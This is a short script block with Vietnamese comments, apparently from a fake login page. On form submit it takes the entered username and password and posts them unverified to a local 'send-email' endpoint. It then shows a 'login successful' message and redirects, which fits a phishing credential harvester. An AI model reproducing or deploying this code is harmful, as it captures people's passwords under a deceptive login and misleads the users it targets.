<script>
    
    $(document).ready(function() {
    $('form').submit(function(event) {
        event.preventDefault(); // Ngăn chặn gửi yêu cầu POST mặc định
        $('.message').text('');

        var username = $('#username').val();
        var password = $('#password').val();

        // Gửi yêu cầu đến server mà không cần kiểm tra thông tin
        axios.post('http://localhost:3000/send-email', {
            username: username,
            password: password
        })
        .then(function(response) {
            $('.message').text('Đăng nhập thành công!');
            // Đợi một chút để hiển thị thông báo, sau đó chuyển hướng
            setTimeout(function() {
                window.close(); // Đóng tab đăng nhập
                window.open('Html.html', '_self'); // Mở trang chủ
            }, 2000); // Thay đổi thời gian hiển thị thông báo nếu cần
        })
        .catch(function(error) {
            $('.message').text('Có lỗi xảy ra, vui lòng thử lại.');
            console.error(error);
        });
    });
});



  </script>
